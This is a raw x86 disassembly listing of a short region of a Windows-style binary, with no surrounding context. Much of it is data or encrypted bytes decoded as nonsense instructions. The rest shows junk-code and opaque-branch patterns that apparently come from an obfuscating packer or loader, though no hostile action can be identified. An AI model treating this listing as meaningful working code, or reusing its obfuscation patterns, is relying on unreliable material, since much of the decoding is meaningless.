  41e553:	shl    DWORD PTR fs:[eax],1
  41e556:	and    eax,0x2a4f9c6c
  41e55b:	jnp    0x41e582
  41e55d:	ret    
  41e55e:	adc    DWORD PTR [edx+eiz*4-0x6f],ecx
  41e562:	jno    0x41e5da
  41e564:	inc    ebx
  41e565:	pop    edx
  41e566:	nop
  41e567:	ror    BYTE PTR [ebp-0x59],1
  41e56a:	dec    esi
  41e56b:	ret    
  41e56c:	ja     0x41e588
  41e56e:	lods   al,BYTE PTR ds:[esi]
  41e56f:	xchg   ecx,eax
  41e570:	scas   eax,DWORD PTR es:[edi]
  41e571:	sub    edx,DWORD PTR [eax-0x2f]
  41e574:	fadd   st(0),st
  41e576:	jo     0x41e553
  41e578:	xlat   BYTE PTR ds:[ebx]
  41e579:	inc    edi
  41e57a:	cmp    dh,bl
  41e57c:	mov    dh,0x8a
  41e57e:	push   esi
  41e57f:	stos   DWORD PTR es:[edi],eax
  41e580:	test   BYTE PTR [ecx+0x782a10c3],dh
  41e586:	sub    BYTE PTR [eax],al
  41e588:	icebp  
  41e589:	cs ret 0x1a3f
  41e58d:	mov    edi,0xb7fd843c
  41e592:	test   dh,bh
  41e594:	ja     0x41e552
  41e596:	jbe    0x41e5bb
  41e598:	rcr    BYTE PTR [edx],1
  41e59a:	lods   al,BYTE PTR ds:[esi]
  41e59b:	xchg   dl,bl
  41e59d:	add    dl,bl
  41e59f:	push   bp
  41e5a1:	iret   
  41e5a2:	pop    es
  41e5a3:	fmul   DWORD PTR ss:[edx+0x4a]
  41e5a7:	or     BYTE PTR [edi],dl
  41e5a9:	stc    
  41e5aa:	sub    DWORD PTR [ecx],ecx
  41e5ac:	sti    
  41e5ad:	jb     0x41e600
  41e5af:	add    eax,0xead35301
  41e5b4:	push   edi
  41e5b5:	mov    ds:0x13d8e507,al
  41e5ba:	js     0x41e5df
  41e5bc:	and    BYTE PTR [ebp+0x25],dl
  41e5bf:	cmp    ecx,DWORD PTR ds:0x399c0e98
  41e5c5:	adc    cl,BYTE PTR ds:0x4ba9062d
  41e5cb:	pop    ds
  41e5cc:	sbb    eax,0x595482b7
  41e5d1:	cli    
  41e5d2:	or     ebp,DWORD PTR es:[ebx]
  41e5d5:	inc    ecx
  41e5d6:	jle    0x41e623
  41e5d8:	lods   al,BYTE PTR ds:[esi]
  41e5d9:	rcl    DWORD PTR [eax-0x52],1
  41e5dc:	add    ecx,DWORD PTR [edi]
  41e5de:	adc    DWORD PTR [edi-0x7e],esp
  41e5e1:	push   eax
  41e5e2:	lds    esi,FWORD PTR [edi]
  41e5e4:	aam    0x22
  41e5e6:	pop    esp
  41e5e7:	fstp   DWORD PTR [ebx]
  41e5e9:	stos   DWORD PTR es:[edi],eax
  41e5ea:	xor    bh,BYTE PTR [edx+0x73]
  41e5ed:	ja     0x41e5dd
  41e5ef:	mov    eax,0x90b1b0a8
  41e5f4:	enter  0xd29a,0x54
  41e5f8:	mov    edx,0x613d34cb
  41e5fd:	adc    al,0x3d
  41e5ff:	sar    DWORD PTR [edx-0xa],cl
  41e602:	jmp    0x41e5b5
  41e604:	or     eax,0x9689c2a0
  41e609:	imul   esp,DWORD PTR [ebx+edx*1],0xbd8049fa
  41e610:	inc    ebp
  41e611:	push   0xc9040786
  41e616:	mov    ds:0xdae5780d,al
  41e61b:	jmp    0x385970f5
  41e620:	popf   
  41e621:	loop   0x41e610
  41e623:	fldenv [esi-0x6]
  41e626:	dec    esi
  41e627:	shl    DWORD PTR [edx],cl
  41e629:	test   BYTE PTR [edi+ebp*1],ah
  41e62c:	jmp    0x635e9621
  41e631:	out    dx,al
  41e632:	mov    ebx,0x8071f0f8
  41e637:	cmp    dl,0x78
  41e63a:	ins    DWORD PTR es:[edi],dx
  41e63b:	fs in  eax,0xd0
  41e63e:	pop    ebp
  41e63f:	mov    dl,0x98
  41e641:	or     al,0x6b
  41e643:	pusha  
  41e644:	jg     0x41e690
  41e646:	and    eax,0xa6c341f9
  41e64b:	jb     0x41e5fc
  41e64d:	jbe    0x41e5fc
  41e64f:	test   eax,0xbd37cf9a
  41e654:	jae    0x41e68a
  41e656:	mov    dl,0xb3
  41e658:	jns    0x41e664
  41e65a:	adc    edi,DWORD PTR [edx+0x25]
  41e65d:	ja     0x41e6d3
  41e65f:	lock ja 0x41e60b
  41e662:	imul   ecx,DWORD PTR [ecx-0x7e],0x4
  41e666:	rol    BYTE PTR [ecx-0xda9da18],1
  41e66c:	xchg   BYTE PTR [edi+0x78ee4e28],ah
  41e672:	jbe    0x41e6a3
  41e674:	push   esp
  41e676:	mov    bh,0x57
  41e678:	call   0x340b220
  41e67d:	arpl   WORD PTR [ebx+ebx*4],cx
  41e680:	imul   DWORD PTR [ecx]
  41e682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e683:	push   ss
  41e684:	inc    esp
  41e685:	pop    es
  41e686:	xor    ch,BYTE PTR [edi+0x1134ebd5]
  41e68c:	jg     0x41e6c6
  41e68e:	xor    DWORD PTR [ebp+0x3dd1f486],ebp
  41e694:	mov    dh,0xdd
  41e696:	and    eax,DWORD PTR [ebx+0x5d]
  41e699:	loopne 0x41e6d7
  41e69b:	lock mov DWORD PTR [ecx-0x11],esp
  41e69f:	je     0x41e6a5
  41e6a1:	mov    eax,0xb9cdddca
  41e6a6:	es out 0xf9,eax
  41e6a9:	std    
  41e6aa:	dec    esp
  41e6ab:	pop    ecx
  41e6ac:	mov    DWORD PTR [esi+eax*4-0x4a],ecx
  41e6b0:	add    ebx,ebx
  41e6b2:	sahf   
  41e6b3:	gs shl dl,1
  41e6b6:	xchg   edx,eax
  41e6b7:	(bad)  
  41e6bb:	mov    WORD PTR ds:0x7c023365,fs
  41e6c1:	cmp    esp,esp
  41e6c3:	cs or  ah,dh
  41e6c6:	dec    edi
  41e6c7:	out    dx,al
  41e6c8:	xchg   DWORD PTR [ecx+eax*4+0x77910743],edi
  41e6cf:	jge    0x41e684
  41e6d1:	jmp    0x41e65b
  41e6d3:	out    dx,al
  41e6d4:	and    al,0xe3
  41e6d6:	sbb    eax,0xfa0fa75d
  41e6db:	or     bl,BYTE PTR [edi]
  41e6dd:	xchg   ebp,eax
  41e6de:	test   DWORD PTR [ebp+0x2778554c],edi
  41e6e4:	es mov al,0x5d
  41e6e7:	mov    DWORD PTR [esi-0x77d7292a],eax
  41e6ed:	and    bh,bh
  41e6ef:	(bad)  [bp+0x3412]
  41e6f4:	test   BYTE PTR [ecx+0x26cbebfd],dh
  41e6fa:	pusha  
  41e6fb:	xchg   edx,eax
  41e6fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6fd:	hlt    
  41e6fe:	or     al,0x20
  41e700:	push   0x2f
  41e702:	adc    edx,DWORD PTR [ecx-0x64]
  41e705:	test   eax,0xaafbbb9f
  41e70a:	sbb    DWORD PTR [ebp+0xfbff42],ebx
  41e710:	addr16 pop esi
  41e712:	jmp    0xc15a:0xaf15ebd0
  41e719:	and    ah,ch
  41e71b:	cli    
  41e71c:	xchg   edi,eax
  41e71d:	jb     0x41e6e8
  41e71f:	xlat   BYTE PTR ds:[ebx]
  41e720:	(bad)  
  41e722:	xchg   ecx,eax
  41e723:	std    
  41e724:	sbb    edx,esi
  41e726:	es dec edx
  41e728:	add    al,0x23
  41e72a:	(bad)  
  41e72b:	iret   
  41e72c:	mov    WORD PTR [esi+0x2af897],ss
  41e732:	jbe    0x41e6cf
  41e734:	outs   dx,BYTE PTR ds:[esi]
  41e735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e736:	jo     0x41e7aa
  41e738:	adc    eax,0xff41a5fd
  41e73d:	sub    ch,ah
  41e73f:	aam    0xfc
  41e741:	loop   0x41e785
  41e743:	pop    esi
  41e744:	push   0xffffffd1
  41e746:	cmp    edx,DWORD PTR [edx-0x72]
  41e749:	jle    0x41e73e
  41e74b:	cmp    ah,BYTE PTR [edi-0x5a]
  41e74e:	push   es
  41e74f:	jne    0x41e6e6
  41e751:	mul    BYTE PTR [edi]
  41e753:	pop    esp
  41e754:	jae    0x41e7d1
  41e756:	add    BYTE PTR [edx+eiz*8],bh
  41e759:	xchg   ah,dh
  41e75b:	dec    ecx
  41e75c:	push   ss
  41e75d:	test   eax,0x9c9c9cae
  41e762:	test   BYTE PTR [ebx+ebx*8+0x27],bl
  41e766:	ins    DWORD PTR es:[edi],dx
  41e767:	mov    ds:0x7898f815,eax
  41e76c:	call   0xbaf86a
  41e771:	addr16 or al,0xae
  41e774:	sub    ecx,DWORD PTR [ebx]
  41e776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e777:	loope  0x41e7f6
  41e779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e77a:	cwde   
  41e77b:	xor    BYTE PTR [edi],ah
  41e77d:	(bad)  
  41e77f:	push   ds
  41e780:	xor    edx,edx
  41e782:	cmp    DWORD PTR ds:0x4281ad,0x0
  41e789:	mov    ecx,0x14ac
  41e78e:	mov    DWORD PTR ds:0x4281a5,0x21a5
  41e798:	jmp    0x41e817
  41e79d:	mov    DWORD PTR ds:0x4282b5,0x7b6b
  41e7a7:	cmp    DWORD PTR ds:0x4281ad,0x0
  41e7ae:	jb     0x41e7ee
  41e7b4:	push   0x428275
  41e7b9:	push   DWORD PTR [ebp-0x18]
  41e7bc:	push   0x428073
  41e7c1:	push   0x6103
  41e7c6:	call   DWORD PTR ds:0x428a98
  41e7cc:	xor    ecx,DWORD PTR ds:0x4282b5
  41e7d2:	xor    DWORD PTR ds:0x428269,0x126
  41e7dc:	mov    ecx,DWORD PTR ds:0x428195
  41e7e2:	or     ecx,DWORD PTR ds:0x4282c9
  41e7e8:	mov    DWORD PTR ds:0x428195,ecx
  41e7ee:	mov    ecx,DWORD PTR ds:0x428219
  41e7f4:	xor    ecx,DWORD PTR ds:0x4281a5
  41e7fa:	mov    DWORD PTR ds:0x428219,ecx
  41e800:	xor    DWORD PTR ds:0x428209,0x5235
  41e80a:	adc    ecx,DWORD PTR ds:0x4282cd
  41e810:	dec    ecx
  41e811:	xor    DWORD PTR ds:0x4282d1,ecx
  41e817:	push   0xb
  41e819:	pop    ecx
  41e81a:	xor    DWORD PTR ds:0x428199,0x4282b5
  41e824:	div    ecx
  41e826:	shr    eax,1
  41e828:	and    eax,0x426c
  41e82d:	push   0x8
  41e82f:	cmp    DWORD PTR ds:0x4282b5,0x0
  41e836:	mov    ecx,0x4005
  41e83b:	not    ecx
  41e83d:	not    ecx
  41e83f:	jmp    0x41e91d
  41e844:	mov    DWORD PTR ds:0x428269,0x2da5
  41e84e:	cmp    DWORD PTR ds:0x4282b5,0x0
  41e855:	ja     0x41e885
  41e85b:	push   0x3660
  41e860:	push   DWORD PTR [ebp-0x28]
  41e863:	push   DWORD PTR [ebp-0x24]
  41e866:	push   0x4563
  41e86b:	call   DWORD PTR ds:0x428a9c
  41e871:	xor    ecx,DWORD PTR ds:0x42827d
  41e877:	xor    ecx,ecx
  41e879:	add    ecx,DWORD PTR ds:0x4282bd
  41e87f:	or     DWORD PTR ds:0x428285,ecx
  41e885:	sbb    ecx,0x5a30
  41e88b:	or     DWORD PTR ds:0x42826d,edi
  41e891:	cmp    DWORD PTR ds:0x428195,0x0
  41e898:	mov    ecx,0x1182
  41e89d:	mov    ecx,DWORD PTR ds:0x428229
  41e8a3:	jmp    0x41e91d
  41e8a8:	mov    DWORD PTR ds:0x4281fd,ecx
  41e8ae:	mov    ecx,DWORD PTR ds:0x428269
  41e8b4:	cmp    DWORD PTR ds:0x428195,0x0
  41e8bb:	jl     0x41e8f7
  41e8c1:	push   0x149d
  41e8c6:	push   DWORD PTR [ebp-0x1c]
  41e8c9:	push   0x7025
  41e8ce:	call   DWORD PTR ds:0x428aa0
  41e8d4:	xor    DWORD PTR ds:0x4281a9,0x422d
  41e8de:	movzx  ecx,WORD PTR ds:0x428289
  41e8e5:	add    ecx,DWORD PTR ds:0x4282b9
  41e8eb:	mov    DWORD PTR ds:0x428289,ecx
  41e8f1:	adc    DWORD PTR ds:0x4282c5,edi
  41e8f7:	sub    DWORD PTR ds:0x4282b1,ebx
  41e8fd:	adc    DWORD PTR ds:0x42822d,edi
  41e903:	sbb    DWORD PTR ds:0x428239,0x4c93
  41e90d:	xor    ecx,ecx
  41e90f:	or     ecx,DWORD PTR ds:0x428255
  41e915:	mov    ecx,DWORD PTR [ecx]
  41e917:	xor    DWORD PTR ds:0x428289,ecx
  41e91d:	pop    ecx
  41e91e:	sub    ecx,eax
  41e920:	mov    DWORD PTR [ebp-0x98],ecx
  41e926:	mov    DWORD PTR [ebp-0x48],0xa04
  41e92d:	mov    eax,ds:0x42251c
  41e932:	or     ecx,0x1071
  41e938:	and    eax,0x2332
  41e93d:	or     DWORD PTR ds:0x4281ad,0x4c8e
  41e947:	add    eax,DWORD PTR [ebp-0x48]
  41e94a:	cmp    DWORD PTR ds:0x428199,0x0
  41e951:	mov    DWORD PTR ds:0x428191,0x105c
  41e95b:	mov    DWORD PTR ds:0x428215,edx
  41e961:	mov    DWORD PTR ds:0x4282c5,ebx
  41e967:	mov    ecx,0x788c
  41e96c:	jmp    0x41e9c5
  41e971:	mov    DWORD PTR ds:0x428215,ebx
  41e977:	cmp    DWORD PTR ds:0x428199,0x0
  41e97e:	jge    0x41e9a3
  41e984:	push   0x428163
  41e989:	call   DWORD PTR ds:0x428aa4
  41e98f:	or     DWORD PTR ds:0x428241,0x588
  41e999:	and    DWORD PTR ds:0x428289,0x5cfd
  41e9a3:	xor    ecx,0x5488
  41e9a9:	xor    DWORD PTR ds:0x428235,0x7e23
  41e9b3:	mov    ecx,DWORD PTR ds:0x42821d
  41e9b9:	xor    ecx,DWORD PTR ds:0x42819d
  41e9bf:	mov    DWORD PTR ds:0x42821d,ecx
  41e9c5:	and    eax,0x7ab9
  41e9ca:	mov    ecx,0x2820
  41e9cf:	sub    ecx,eax
  41e9d1:	neg    eax
  41e9d3:	mov    DWORD PTR [ebp-0x80],ecx
  41e9d6:	adc    DWORD PTR ds:0x428271,0xc5b
  41e9e0:	mov    DWORD PTR [ebp-0xac],0xb83
  41e9ea:	cmp    DWORD PTR ds:0x428201,0x0
  41e9f1:	mov    DWORD PTR ds:0x428229,0x573
  41e9fb:	mov    DWORD PTR ds:0x42827d,0x1ad0
  41ea05:	jmp    0x41ed6a
  41ea0a:	mov    DWORD PTR ds:0x428195,0x2086
  41ea14:	cmp    DWORD PTR ds:0x428201,0x0
  41ea1b:	jb     0x41ea39
  41ea21:	push   DWORD PTR [ebp-0x24]
  41ea24:	push   DWORD PTR [ebp-0x10]
  41ea27:	call   DWORD PTR ds:0x4289bc
  41ea2d:	sbb    ecx,ecx
  41ea2f:	sub    DWORD PTR ds:0x42820d,0x4a14
  41ea39:	xor    ecx,ecx
  41ea3b:	xor    ecx,DWORD PTR ds:0x428239
  41ea41:	and    DWORD PTR ds:0x4282b5,ecx
  41ea47:	adc    ecx,0x2096
  41ea4d:	cmp    DWORD PTR ds:0x4281fd,0x0
  41ea54:	mov    DWORD PTR ds:0x428221,0x5b35
  41ea5e:	mov    ecx,0x625c
  41ea63:	not    ecx
  41ea65:	mov    DWORD PTR ds:0x4282d1,edi
  41ea6b:	jmp    0x41ed6a
  41ea70:	mov    DWORD PTR ds:0x428199,0x2976
  41ea7a:	not    eax
  41ea7c:	cmp    DWORD PTR ds:0x4281fd,0x0
  41ea83:	je     0x41eaac
  41ea89:	push   DWORD PTR [ebp-0x1c]
  41ea8c:	push   0x74f2
  41ea91:	push   0x20d0
  41ea96:	call   DWORD PTR ds:0x428aa8
  41ea9c:	and    DWORD PTR ds:0x4282bd,0x4da1
  41eaa6:	or     DWORD PTR ds:0x428191,edi
  41eaac:	xor    ecx,DWORD PTR ds:0x428231
  41eab2:	and    ecx,DWORD PTR ds:0x428239
  41eab8:	xor    DWORD PTR ds:0x42822d,0x55b2
  41eac2:	or     DWORD PTR ds:0x428219,ecx
  41eac8:	xor    eax,0x6d9e
  41eacd:	jmp    0x41ed6a
  41ead2:	sub    edx,DWORD PTR [edx-0x48884cb2]
  41ead8:	aaa    
  41ead9:	xchg   edx,eax
  41eada:	dec    esp
  41eadb:	aas    
  41eadc:	adc    DWORD PTR [ecx],esi
  41eade:	jne    0x41eb5f
  41eae0:	push   edi
  41eae1:	inc    ebp
  41eae2:	sub    eax,0xb2bbc192
  41eae7:	mov    edi,0xe541bbbb
  41eaec:	cmp    BYTE PTR [ecx],dl
  41eaee:	clc    
  41eaef:	imul   edi,DWORD PTR [ebx],0xffffffcf
  41eaf2:	sti    
  41eaf3:	sbb    BYTE PTR [ecx],bl
  41eaf5:	and    ecx,ecx
  41eaf7:	or     DWORD PTR [eax+ecx*2],edi
  41eafa:	sub    BYTE PTR [edx+0x52cb5a7b],ch
  41eb00:	xor    BYTE PTR [ebx],dl
  41eb02:	pop    ecx
  41eb03:	adc    BYTE PTR [ecx-0x1f],dh
  41eb06:	jbe    0x41eb17
  41eb08:	push   edx
  41eb09:	and    al,0xc9
  41eb0b:	adc    ebp,DWORD PTR [edi-0x16d29eba]
  41eb11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb12:	push   es
  41eb13:	mov    edi,0xa00cf17a
  41eb18:	dec    edx
  41eb19:	push   ebx
  41eb1a:	je     0x41eada
  41eb1c:	das    
  41eb1d:	dec    ebx
  41eb1e:	adc    BYTE PTR [edx-0x983777c],bl
  41eb24:	adc    DWORD PTR [ebx+eax*4+0x2d],0x85e9189a
  41eb2c:	out    dx,eax
  41eb2d:	iret   
  41eb2e:	neg    BYTE PTR [esi-0x4f1b4ef2]
  41eb34:	xchg   ecx,eax
  41eb35:	sbb    esi,DWORD PTR [ebx+0x41]
  41eb38:	or     dl,BYTE PTR [edi+0x15353fdf]
  41eb3e:	dec    eax
  41eb3f:	(bad)  
  41eb40:	sub    eax,0x8cd2b9ff
  41eb45:	(bad)  
  41eb46:	xchg   esi,eax
  41eb47:	cli    
  41eb48:	fwait
  41eb49:	mov    dl,0x7e
  41eb4b:	clc    
  41eb4c:	mov    BYTE PTR [edx+0x770169fb],dh
  41eb52:	jnp    0x41eb09
  41eb54:	scas   al,BYTE PTR es:[di]
  41eb56:	xor    al,0x31
  41eb58:	xor    al,0xfa
  41eb5a:	push   ebx
  41eb5b:	xor    DWORD PTR [ecx+0x10],edx
  41eb5e:	cmp    al,0xf1
  41eb60:	push   esp
  41eb61:	retf   
  41eb62:	call   0x9103b674
  41eb67:	inc    esi
  41eb68:	neg    ebx
  41eb6a:	loope  0x41eaf2
  41eb6c:	and    eax,0xa7dfc7aa
  41eb71:	fdivr  DWORD PTR [edi+edx*8-0x12]
  41eb75:	(bad)  
  41eb76:	lahf   
  41eb77:	in     eax,dx
  41eb78:	pop    esp
  41eb79:	inc    esp
  41eb7a:	jo     0x41eb0d
  41eb7c:	call   0xa0e2:0x8b4f4426
  41eb83:	ins    BYTE PTR es:[edi],dx
  41eb84:	mov    esi,0x3b41d16d
  41eb89:	pop    esi
  41eb8a:	adc    DWORD PTR ds:0xab8f09e9,0xdb25163a
  41eb94:	dec    esi
  41eb95:	pop    eax
  41eb96:	int3   
  41eb97:	add    ch,BYTE PTR [edx]
  41eb99:	das    
  41eb9a:	call   0x37fb:0x22be8397
  41eba1:	lods   eax,DWORD PTR ds:[esi]
  41eba2:	sub    ebx,DWORD PTR [edi-0x7abc0b5a]
  41eba8:	dec    ebp
  41eba9:	je     0x41ebc1
  41ebab:	adc    eax,0x79637441
  41ebb0:	call   0xf2079b98
  41ebb5:	mov    eax,0x8ba7806c
  41ebba:	jmp    0xe396:0x17c4de4b
  41ebc1:	std    
  41ebc2:	mov    bl,0x30
  41ebc4:	aaa    
  41ebc5:	cmp    eax,0xb5fcc5f3
  41ebca:	(bad)  
  41ebcb:	rol    DWORD PTR [ebx],1
  41ebcd:	cmp    bl,BYTE PTR [edx]
  41ebcf:	mov    eax,ds:0x22a33dae
  41ebd4:	in     eax,dx
  41ebd5:	add    BYTE PTR [ecx+0x1],dh
  41ebd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebd9:	rcl    DWORD PTR [ebp+0x15],0x5b
  41ebdd:	xchg   esp,eax
  41ebde:	mov    eax,fs
  41ebe0:	mov    al,ds:0xdff07d30
  41ebe5:	sbb    DWORD PTR ds:[ebx-0x7f],edi
  41ebe9:	les    ebx,FWORD PTR [edx+0x4d]
  41ebec:	call   0x3fb7:0xffb4dca6
  41ebf3:	adc    BYTE PTR [bx],al
  41ebf6:	jnp    0x41ec3f
  41ebf8:	inc    ecx
  41ebf9:	jo     0x41ebdf
  41ebfb:	push   ebp
  41ebfc:	stos   DWORD PTR es:[edi],eax
  41ebfd:	bound  edx,QWORD PTR [esi]
  41ebff:	sbb    eax,0x71fc0494
  41ec04:	pop    edi
  41ec05:	dec    ecx
  41ec06:	adc    ebx,DWORD PTR [eax+ebx*4]
  41ec09:	inc    eax
  41ec0a:	jns    0x41ec73
  41ec0c:	jnp    0x41ec1b
  41ec0e:	dec    edx
  41ec0f:	outs   dx,BYTE PTR ds:[esi]
  41ec10:	(bad)  
  41ec11:	sbb    BYTE PTR [esp+edi*4],bh
  41ec14:	push   es
  41ec15:	aas    
  41ec16:	dec    edx
  41ec17:	pop    esi
  41ec18:	mov    ch,0x73
  41ec1a:	sti    
  41ec1b:	enter  0x69a,0x86
  41ec1f:	repz and eax,0xb6771de3
  41ec25:	mov    ch,0x37
  41ec27:	lds    ecx,FWORD PTR [ebx-0x5dc5cfc2]
  41ec2d:	mov    BYTE PTR [ebp+0x5a1d8f0a],cl
  41ec33:	pop    edi
  41ec34:	push   esp
  41ec35:	pop    eax
  41ec36:	icebp  
  41ec37:	xchg   ecx,eax
  41ec38:	ret    0x67f9
  41ec3b:	rcl    ebp,0x84
  41ec3e:	pop    esi
  41ec3f:	xor    al,0xeb
  41ec41:	dec    eax
  41ec42:	loope  0x41ec25
  41ec44:	out    0xee,eax
  41ec46:	stc    
  41ec47:	ret    
  41ec48:	in     eax,0x18
  41ec4a:	mov    ecx,0x20a49d5e
  41ec4f:	dec    ebx
  41ec50:	adc    ch,BYTE PTR ds:0x3d7948b9
  41ec56:	mov    al,0x8f
  41ec58:	fidivr DWORD PTR [edi]
  41ec5a:	(bad)  
  41ec5b:	mov    ch,BYTE PTR [ebx-0xc]
  41ec5e:	sub    edi,DWORD PTR [ebp-0x79d9011f]
  41ec64:	(bad)  
  41ec65:	div    edi
  41ec67:	mov    al,0xf6
  41ec69:	jmp    0xe38c73d5
  41ec6e:	test   BYTE PTR [edx+0x4c176d17],cl
  41ec74:	imul   edx,DWORD PTR [edi-0x8],0x2a
  41ec78:	push   ebp
  41ec79:	js     0x41ec60
  41ec7b:	xor    edi,ebx
  41ec7d:	dec    ebp
  41ec7e:	ret    
  41ec7f:	sti    
  41ec80:	mov    DWORD PTR [edx],edx
  41ec82:	mov    ebp,DWORD PTR [eax-0x2c]
  41ec85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec86:	cmp    eax,0x7709ef1b
  41ec8b:	(bad)  
  41ec8c:	or     al,0xb6
  41ec8e:	mov    ah,0x9a
  41ec90:	jb     0x41ed0b
  41ec92:	xchg   edi,eax
  41ec93:	jae    0x41ec4f
  41ec95:	aaa    
  41ec96:	or     bh,bl
  41ec98:	imul   ebp,DWORD PTR [ecx-0x15],0xffffffa3
  41ec9c:	xor    dh,BYTE PTR [ebx+0x3c]
  41ec9f:	mov    eax,DWORD PTR [eax]
  41eca1:	aas    
  41eca2:	add    bh,0x58
  41eca5:	ins    DWORD PTR es:[edi],dx
  41eca6:	push   0x70be0307
  41ecab:	test   al,0xe8
  41ecad:	push   ebx
  41ecae:	loop   0x41ed19
  41ecb0:	and    eax,0xe2108db3
  41ecb5:	inc    ebp
  41ecb6:	jbe    0x41ec7a
  41ecb8:	cmp    DWORD PTR [eax+ebx*4],ecx
  41ecbb:	mov    ?,WORD PTR ds:0x7decad0
  41ecc1:	cmc    
  41ecc2:	std    
  41ecc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecc4:	outs   dx,DWORD PTR ds:[esi]
  41ecc5:	retf   
  41ecc6:	mov    ebp,0xb4fced0c
  41eccb:	outs   dx,DWORD PTR ds:[esi]
  41eccc:	lods   eax,DWORD PTR ds:[esi]
  41eccd:	dec    eax
  41ecce:	fwait
  41eccf:	push   edx
  41ecd0:	mov    ds:0x3f169b6c,eax
  41ecd5:	(bad)
  41ecd9:	dec    esp
  41ecda:	fdivr  st,st(5)
  41ecdc:	xor    DWORD PTR [edx],0x5a
  41ecdf:	or     al,ch
  41ece1:	call   0xf57bb255
  41ece6:	sub    DWORD PTR [eax+0xf4e522f],esi
  41ecec:	mov    ebx,0x24105a34
  41ecf1:	push   ds
  41ecf2:	out    0xd9,eax
  41ecf4:	pop    edi
  41ecf5:	(bad)  
  41ecf6:	popw   ds
  41ecf8:	lahf   
  41ecf9:	aaa    
  41ecfa:	pushf  
  41ecfb:	lods   eax,DWORD PTR ds:[esi]
  41ecfc:	pop    DWORD PTR [esi+0x43]
  41ecff:	mov    BYTE PTR [eax+ecx*1-0x3afbe6],dl
  41ed06:	test   DWORD PTR [ebx-0x39],ebp
  41ed09:	test   BYTE PTR [eax-0x57ec76d7],ch
  41ed0f:	out    dx,eax
  41ed10:	das    
  41ed11:	clc    
  41ed12:	add    al,0x64
  41ed14:	clc    
  41ed15:	jae    0x41ed52
  41ed17:	das    
  41ed18:	cli    
  41ed19:	out    dx,al
  41ed1a:	add    eax,0x49a0af95
  41ed1f:	jbe    0x41ecab
  41ed21:	jmp    0x2240ceef
  41ed26:	pop    edx
  41ed27:	fmulp  st(3),st
  41ed29:	jne    0x41ed22
  41ed2b:	jmp    0x41ed29
  41ed2d:	dec    edx
  41ed2e:	push   ss
  41ed2f:	in     eax,dx
  41ed30:	and    ecx,DWORD PTR [edx+0x4c]
  41ed33:	inc    eax
  41ed34:	push   edi
  41ed35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed36:	cmp    al,0xe4
  41ed38:	out    dx,eax
  41ed39:	sub    BYTE PTR [eax],dh
  41ed3b:	add    ebp,edi
  41ed3d:	mov    al,0x24
  41ed3f:	leave  
  41ed40:	push   ecx
  41ed41:	push   ss
  41ed42:	pop    esi
  41ed43:	add    al,0x3a
  41ed45:	fadd   st(2),st
  41ed47:	call   0xfde6:0xe6aa3fcd
  41ed4e:	in     al,dx
  41ed4f:	sahf   
  41ed50:	adc    bh,BYTE PTR [esi+0x6a12f281]
  41ed56:	xor    bl,BYTE PTR [ebp-0x15]
  41ed59:	mov    esp,0x6b3734fe
  41ed5e:	inc    eax
  41ed5f:	out    dx,eax
  41ed60:	jmp    0x73c3:0xf332a477
  41ed67:	dec    ecx
  41ed68:	es and al,bh
  41ed6b:	inc    ebp
  41ed6c:	hlt    
  41ed6d:	fiadd  DWORD PTR [ecx]
  41ed6f:	add    BYTE PTR [eax],al
  41ed71:	xor    ecx,ecx
  41ed73:	xor    ecx,DWORD PTR ds:0x4281cd
  41ed79:	mov    eax,ds:0x4281d5
  41ed7e:	sub    ecx,eax
  41ed80:	imul   ecx,DWORD PTR [ecx+eax*1]
  41ed84:	mov    DWORD PTR [ebp-0xa8],0xe1c
  41ed8e:	cmp    DWORD PTR ds:0x4282d1,0x0
  41ed95:	mov    DWORD PTR ds:0x4282b5,0x736b
  41ed9f:	not    ecx
  41eda1:	mov    DWORD PTR ds:0x42819d,0x1d19
  41edab:	mov    DWORD PTR ds:0x4282bd,0x508a
  41edb5:	jmp    0x41ee2b
  41edba:	mov    DWORD PTR ds:0x428275,ecx
  41edc0:	cmp    DWORD PTR ds:0x4282d1,0x0
  41edc7:	je     0x41ee00
  41edcd:	push   0x7434
  41edd2:	push   DWORD PTR [ebp-0x24]
  41edd5:	push   0x42804a
  41edda:	push   0x42804a
  41eddf:	push   DWORD PTR [ebp-0x20]
  41ede2:	call   DWORD PTR ds:0x4289c0
  41ede8:	sbb    DWORD PTR ds:0x4282b1,ecx
  41edee:	mov    ecx,DWORD PTR ds:0x42823d
  41edf4:	add    DWORD PTR ds:0x4282b1,ecx
  41edfa:	sub    DWORD PTR ds:0x4281fd,ecx
  41ee00:	dec    ecx
  41ee01:	adc    DWORD PTR ds:0x4282d1,ecx
  41ee07:	mov    ecx,DWORD PTR ds:0x428229
  41ee0d:	sub    ecx,DWORD PTR ds:0x428285
  41ee13:	mov    DWORD PTR ds:0x428229,ecx
  41ee19:	sub    ecx,ecx
  41ee1b:	mov    ecx,DWORD PTR ds:0x4281c9
  41ee21:	mov    eax,ds:0x428249
  41ee26:	sub    eax,ecx
  41ee28:	and    ecx,DWORD PTR [ecx+eax*1]
  41ee2b:	mov    eax,ds:0x422524
  41ee30:	add    eax,0x3e76
  41ee35:	imul   eax,eax,0x108c
  41ee3b:	imul   eax,eax,0x7293
  41ee41:	mov    DWORD PTR ds:0x428235,0x5d10
  41ee4b:	mov    ecx,0x9257d9fc
  41ee50:	sub    ecx,eax
  41ee52:	sub    DWORD PTR ds:0x428275,0x428199
  41ee5c:	add    ecx,DWORD PTR [ebp+0x8]
  41ee5f:	push   ecx
  41ee60:	call   0x40fe6a
  41ee65:	cmp    DWORD PTR ds:0x428205,0x0
  41ee6c:	mov    esi,DWORD PTR ds:0x428225
  41ee72:	mov    edx,0x4964
  41ee77:	mov    DWORD PTR ds:0x42826d,0x46e1
  41ee81:	jmp    0x41eedd
  41ee86:	mov    DWORD PTR ds:0x42823d,0x4a8a
  41ee90:	mov    DWORD PTR ds:0x428235,0x2e71
  41ee9a:	cmp    DWORD PTR ds:0x428205,0x0
